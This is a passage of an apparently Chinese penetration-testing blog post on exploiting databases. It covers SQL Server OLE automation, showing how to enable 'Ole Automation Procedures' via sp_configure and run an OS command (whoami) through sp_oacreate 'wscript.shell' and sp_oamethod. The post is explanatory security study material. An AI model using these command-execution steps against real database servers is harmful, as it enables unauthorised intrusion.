+<h3 id="sp-OAMethod"><a href="#sp-OAMethod" class="headerlink" title="sp_OAMethod"></a>sp_OAMethod</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_OAMethod objecttoken , methodname</span><br><span class="line">    [ , returnvalue OUTPUT ]</span><br><span class="line">    [ , [ @parametername = ] parameter [ OUTPUT ] [ ...n ] ]</span><br><span class="line">[ ; ]</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h3><p>查看<code>SP_OACREATE</code>扩展存储过程是否存在</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260504153459182.png" class="">
+
+<p>同样更改<code>sp_configure</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure 'show advanced options', 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure 'Ole Automation Procedures', 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>WScript.Shell.Run</code> 主要用于启动程序，本身不会把 stdout 直接返回到 SQL 查询结果中，所以常见做法是将命令输出重定向到文件。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>DECLARE @shell INT</code> 用于声明变量，保存 OLE 对象实例的 object token。后续 <code>sp_OAMethod</code> 通过这个 token 调用该对象的方法。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int</span><br></pre></td></tr></tbody></table></figure>
+
+<p>创建OLE对象实例</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_oacreate 'wscript.shell',@shell output</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260504165534644.png" class="">
+
+<p>调用前面创建OLE对象中的run方法，<code>'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'</code>是run方法的参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260504172317106.png" class="">
+
+
+
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/357538.html">https://www.freebuf.com/articles/web/357538.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">https://www.freebuf.com/articles/database/291175.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/261917.html">https://www.freebuf.com/articles/network/261917.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://daxigua21.github.io">Wudalang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://daxigua21.github.io/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/">https://daxigua21.github.io/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://daxigua21.github.io" target="_blank">Wu_dalang</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/conver11.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="PrintSpoofer提权漏洞"><img class="cover" src="/img/conver6.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PrintSpoofer提权漏洞</div></div><div class="info-2"><div class="info-item-1">命名管道(Named pipes)命名管道由命名管道的服务端创建，使用windows API  创建管道实例，实现进程与进程之间的通信   1.命名管道用于进程与进程之间双向的通信，通过安全检查的进程都可以访问命名管道 2.命名管道所有的实例共享一个管道名称（如\\.\pipe\MyPipe，通过CreateNamedPipe函数设置），实例之间根据句柄和缓存区区分 3.命名管道有服务端和客户端，一个服务端可以对多个客户端，且不同的客户端使用不同的管道实例 可以通过file://.//pipe//查看Windows 系统上所有激活的命名管道列表   或者是在powershell中执行s 1Get-ChildItem \\.\pipe\    访问令牌访问令牌是描述进程或线程的安全上下文的对象。 令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。 用户登录时，系统会通过将密码与存储在安全数据库中的信息进行比较来验证用户的密码。 如果 对密码进行身份验证，系统将生成访问令牌。 代表此用户执行的每个进程都有此访问令牌的副本。 令牌结构 用户帐户的安全标识符 （SID） 用户所属组...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">Wudalang</div><div class="author-info-description">wu_dalang的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><div id="welcome-info"></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql"><span class="toc-number">1.</span> <span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">1.1.</span> <span class="toc-text">写入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">前提条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#secure-file-priv"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">secure_file_priv</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#into-outfile"><span class="toc-number">1.1.2.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log"><span class="toc-number">1.1.3.</span> <span class="toc-text">log</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#general-log"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">general_log</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file"><span class="toc-number">1.2.</span> <span class="toc-text">load_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">mysql&lt;5.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-5-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">Mysql &gt;= 5.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.4.</span> <span class="toc-text">具体步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">查看权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bsecure-file-priv%E5%8F%82%E6%95%B0"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">查看secure_file_priv参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">确定版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Amysql%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">确定mysql的安装目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8Fdll%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">写入恶意dll文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">创建函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.4.7.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.4.8.</span> <span class="toc-text">删除函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLServer"><span class="toc-number">2.</span> <span class="toc-text">SQLServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">2.1.</span> <span class="toc-text">xp_cmdshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-number">2.1.3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">判断条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">开启xp_cmdshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OLE%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.</span> <span class="toc-text">OLE对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-OACreate"><span class="toc-number">2.2.1.</span> <span class="toc-text">sp_OACreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-OAMethod"><span class="toc-number">2.2.2.</span> <span class="toc-text">sp_OAMethod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.3.</span> <span class="toc-text">执行步骤</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/" title="渗透测试数据库利用"><img src="/img/conver11.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试数据库利用"></a><div class="content"><a class="title" href="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/" title="渗透测试数据库利用">渗透测试数据库利用</a><time datetime="2026-05-04T11:17:35.000Z" title="发表于 2026-05-04 19:17:35">2026-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="PrintSpoofer提权漏洞"><img src="/img/conver6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PrintSpoofer提权漏洞"></a><div class="content"><a class="title" href="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="PrintSpoofer提权漏洞">PrintSpoofer提权漏洞</a><time datetime="2026-04-14T13:05:30.000Z" title="发表于 2026-04-14 21:05:30">2026-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/31/polarisctf/" title="polarisctf"><img src="/img/conver10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="polarisctf"></a><div class="content"><a class="title" href="/2026/03/31/polarisctf/" title="polarisctf">polarisctf</a><time datetime="2026-03-31T13:57:48.000Z" title="发表于 2026-03-31 21:57:48">2026-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/17/liunx%E7%B3%BB%E7%BB%9F%E4%B8%8B-proc%E7%9A%84%E5%88%A9%E7%94%A8/" title="liunx系统下/proc的利用"><img src="/img/conver3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="liunx系统下/proc的利用"></a><div class="content"><a class="title" href="/2026/01/17/liunx%E7%B3%BB%E7%BB%9F%E4%B8%8B-proc%E7%9A%84%E5%88%A9%E7%94%A8/" title="liunx系统下/proc的利用">liunx系统下/proc的利用</a><time datetime="2026-01-17T07:45:14.000Z" title="发表于 2026-01-17 15:45:14">2026-01-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/11/xml-CVE-2024-48990/" title="xml&amp;CVE-2024-48990"><img src="/img/conver12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xml&amp;CVE-2024-48990"></a><div class="content"><a class="title" href="/2026/01/11/xml-CVE-2024-48990/" title="xml&amp;CVE-2024-48990">xml&amp;CVE-2024-48990</a><time datetime="2026-01-11T05:51:24.000Z" title="发表于 2026-01-11 13:51:24">2026-01-11</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 - 2026 By Wudalang</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><script src="/js/welcome.js"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
